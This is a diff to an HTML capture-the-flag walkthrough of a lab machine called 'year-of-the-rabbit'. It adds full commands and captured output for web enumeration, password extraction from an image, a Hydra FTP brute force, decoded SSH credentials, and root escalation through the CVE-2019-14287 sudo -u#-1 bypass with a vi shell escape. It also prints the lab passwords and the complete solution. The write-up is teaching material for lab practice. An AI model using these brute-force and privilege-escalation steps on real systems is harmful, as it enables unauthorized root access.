@@ -34,11 +34,32 @@
         <div class="step-num">1</div>
         <div class="step-body">
           <div class="step-title">Climb a chain of hidden paths</div>
+          <p>A service scan shows the usual trio, FTP, SSH, and a web server:</p>
+          <pre><code>21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</code></pre>
           <p>A directory brute force finds <code>/assets</code>, and viewing its source rather than just its rendered page pays off immediately, a comment left inside a stylesheet:</p>
-          <pre><code>/* Nice to see someone checking the stylesheets.
+          <pre><code>* {
+  margin: 0px 0px 0px 0px;
+  padding: 0px 0px 0px 0px;
+}
+
+/* Nice to see someone checking the stylesheets.
    Take a look at the page: /sup3r_s3cr3t_fl4g.php */</code></pre>
-          <p>Requesting that page in Burp Suite shows a 302 redirect carrying its own hidden value in the <code>Location</code> header, a second hidden directory token entirely. Visiting that directory lists a single file, downloaded directly:</p>
-          <pre><code>curl "http://&lt;target&gt;/&lt;hidden-token&gt;/Hot_Babe.png" --output hotbabe.png</code></pre>
+          <p>Requesting that page in Burp Suite shows a 302 redirect carrying its own hidden value in the <code>Location</code> header:</p>
+          <pre><code>GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
+Host: 10.10.77.215
+
+HTTP/1.1 302 Found
+Date: Sun, 01 Aug 2021 23:51:20 GMT
+Server: Apache/2.4.10 (Debian)
+Location: intermediary.php?hidden_directory=/WExYY2Cv-qU</code></pre>
+          <p>Visiting that directory lists a single file, downloaded directly:</p>
+          <pre><code>Index of /WExYY2Cv-qU
+Name              Last modified          Size
+Hot_Babe.png      2020-01-23 00:34       464K
+
+$ curl "http://10.10.77.215/WExYY2Cv-qU/Hot_Babe.png" --output hotbabe.png</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>Source code, response headers, and redirect targets all carry information a rendered page never shows. Three completely different hiding spots, a code comment, an HTTP header, a directory listing, each only gave something up because they were actually inspected, not just clicked through.</p>
@@ -51,8 +72,27 @@
         <div class="step-body">
           <div class="step-title">Pull credentials straight out of an image</div>
           <p><code>strings</code> against the downloaded PNG doesn't just find garbage binary noise, it finds plaintext left inside the file on purpose:</p>
-          <pre><code>strings hotbabe.png</code></pre>
-          <p>The output names an FTP username directly and lists more than a dozen candidate passwords, effectively a small wordlist embedded in an image file.</p>
+          <pre><code>$ strings hotbabe.png
+
+Eh, you've earned this. Username for FTP is ftpuser
+One of these is the password:
+Mou+56n%QK8sr
+1618B0AUshw1M
+A56IpIl%1s02u
+vTFbDzX9&amp;Nmu?
+FfF~sfu^UQZmT
+8FF?iKO27b~V0
+ua4W~2-@y7dE$
+3j39aMQQ7xFXT
+Wb4--CTc4ww*-
+u6oY9?nHv84D&amp;
+0iBp4W69Gr_Yf
+TS*%miyPsGV54
+C77O3FIy0c0sd
+O14xEhgg0Hxz1
+5dpv#Pr$wqH7F
+1G8Ucoce1+gS5</code></pre>
+          <p>Sixteen candidate passwords, saved to a file (<code>rabbit.txt</code>) for the next step, effectively a small wordlist embedded in an image.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>Image files routinely carry extra bytes beyond their actual pixel data, and <code>strings</code> doesn't care what format a file claims to be, it just reports every printable run of text it finds. A quick strings pass costs nothing and occasionally hands over exactly this.</p>
@@ -65,8 +105,18 @@
         <div class="step-body">
           <div class="step-title">Brute-force FTP with the embedded wordlist</div>
           <p>With a username and a short, specific password list in hand, a targeted Hydra run beats guessing blind by a wide margin:</p>
-          <pre><code>hydra ftp://&lt;target&gt; -l ftpuser -P rabbit.txt</code></pre>
-          <p>One valid password comes back, and logging in over FTP lists a single file, <code>Eli's_Creds.txt</code>.</p>
+          <pre><code>hydra ftp://10.10.77.215 -l ftpuser -P rabbit.txt
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
+[21][ftp] host: 10.10.77.215   login: ftpuser   password: 5iez1wGXKfPKQ</code></pre>
+          <p>Logging in over FTP with that password lists a single file:</p>
+          <pre><code>$ ftp 10.10.77.215
+Name (10.10.77.215:max): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp&gt; ls
+-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>A wordlist of a dozen candidates instead of rockyou's many millions turns a brute force from "hope it finishes" into "basically instant." Finding that list was the real work, the cracking itself was almost a formality.</p>
@@ -78,7 +128,19 @@
         <div class="step-num">4</div>
         <div class="step-body">
           <div class="step-title">Decode a Brainfuck-encoded credentials file</div>
-          <p>The downloaded file's contents aren't a hash or a cipher, they're source code in Brainfuck, an esoteric programming language built almost entirely from eight punctuation characters. Running it through an online Brainfuck interpreter instead of trying to hand-trace it decodes it instantly into a second username and password.</p>
+          <p>The downloaded file's contents aren't a hash or a cipher, they're source code in Brainfuck, an esoteric programming language built almost entirely from eight punctuation characters:</p>
+          <pre><code>++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- --.&lt;+
+++++[ -&gt;---
+--&lt;]&gt; -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;.&lt;++ +[-&gt; ++&lt;]&gt; +++++ +.&lt;++
+++[- &gt;++++
++&lt;]&gt;+ ++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ ++++[ -&gt;+++
++++&lt;] &gt;+++. &lt;++++ +++++
+&lt;]&gt;++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- -.+++ +.&lt;++ ++++[
+-&gt;++ +++++
+[-&gt;++ ++++ &lt;]&gt;+. &lt;+++[ -&gt;--- &lt;]&gt;-- ---.- .---- .&lt;</code></pre>
+          <p>Running it through an online Brainfuck interpreter instead of trying to hand-trace it decodes it instantly:</p>
+          <pre><code>User: eli
+Password: DSpDiM1wAEwid</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>Brainfuck isn't encryption and provides no real secrecy, it's obscurity at best. Recognizing the character set (mostly <code>&lt; &gt; + - . [ ]</code>) is the only skill needed, an interpreter does the actual work in seconds.</p>
@@ -90,9 +152,29 @@
         <div class="step-num">5</div>
         <div class="step-body">
           <div class="step-title">Follow a message to a hidden directory</div>
-          <p>SSHing in with the decoded credentials surfaces a login-of-the-day message, a note from "Root" to another user mentioning a hidden location named with a leetspeak version of "secret." Searching the filesystem for exactly that finds it:</p>
-          <pre><code>find / -type d -name "*s3cr3t*" 2>/dev/null</code></pre>
-          <p>Inside sits a single oddly-named dotfile. Reading it turns up another note from "Root", this one scolding the next user over a weak password, and naming that password directly in the text of the complaint.</p>
+          <p>SSHing in with the decoded credentials (<code>eli:DSpDiM1wAEwid</code>) surfaces a login-of-the-day message:</p>
+          <pre><code>$ ssh eli@10.10.77.215
+eli@10.10.77.215's password:
+
+1 new message
+Message from Root to Gwendoline:
+"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place.
+I've left you a hidden message there"
+END MESSAGE</code></pre>
+          <p>A note from "Root" to another user mentioning a hidden location named with a leetspeak version of "secret." Searching the filesystem for exactly that finds it:</p>
+          <pre><code>eli@year-of-the-rabbit:~$ find / -type d -name *s3cr3t* 2&gt;/dev/null
+/usr/games/s3cr3t
+eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
+-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!</code></pre>
+          <p>Inside sits a single oddly-named dotfile. Reading it turns up another note from "Root", this one scolding the next user over a weak password, and naming that password directly in the text of the complaint:</p>
+          <pre><code>eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
+Your password is awful, Gwendoline.
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+    -Root</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>An MOTD banner is easy to skim past, but on a CTF box it's exactly the kind of place a designed clue gets planted. Following a hint instead of ignoring it as flavor text led directly to a second account's credentials.</p>
@@ -104,9 +186,17 @@
         <div class="step-num">6</div>
         <div class="step-body">
           <div class="step-title">Check what the next user can run as root</div>
-          <p>Switching to that account and checking sudo rights shows a narrowly scoped, password-free permission:</p>
-          <pre><code>sudo -l</code></pre>
-          <p>The rule reads <code>(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt</code>, meaning this user can run <code>vi</code> on exactly one file, as any user, except root by name.</p>
+          <p>Switching to that account (password <code>MniVCQVhQHUNI</code>, straight out of Root's own complaint) and checking sudo rights shows a narrowly scoped, password-free permission:</p>
+          <pre><code>gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt</code></pre>
+          <p>This user can run <code>vi</code> on exactly one file, as any user, except root by name. Trying it as root directly confirms the restriction is actually enforced:</p>
+          <pre><code>gwendoline@year-of-the-rabbit:~$ sudo -u root /usr/bin/vi /home/gwendoline/user.txt
+Sorry, user gwendoline is not allowed to execute '/usr/bin/vi /home/gwendoline/user.txt' as root on year-of-the-rabbit.</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p><code>vi</code> itself is a well-known sudo privilege-escalation target: once it's running with elevated rights, its own shell-out command spawns a shell with those same rights. The <code>!root</code> exclusion looks like it closes that off entirely, which is exactly what makes it worth testing properly rather than taking at face value.</p>
@@ -122,11 +212,12 @@
           <pre><code>sudo -V
 <span class="cm"># Sudo version 1.8.10p3</span></code></pre>
           <p>CVE-2019-14287 affects exactly this kind of <code>!root</code> exclusion: passing a numeric UID of <code>-1</code> (or its unsigned equivalent) instead of a username causes sudo to resolve it back to UID 0, root, since the exclusion only ever matched the literal name:</p>
-          <pre><code>sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt</code></pre>
+          <pre><code>gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt</code></pre>
           <p><code>vi</code> opens running as root. From inside it, shelling out confirms it completely:</p>
           <pre><code>:!/bin/bash
-whoami
-<span class="cm"># root</span></code></pre>
+
+root@year-of-the-rabbit:/home/gwendoline# whoami
+root</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>This is the same class of bug as the UID-wraparound trick elsewhere in this style of misconfiguration, but here it has an actual CVE and a known-fixed version, which is why checking <code>sudo -V</code> before assuming a dead end is worth doing every time a username-based exclusion shows up in <code>sudo -l</code>.</p>
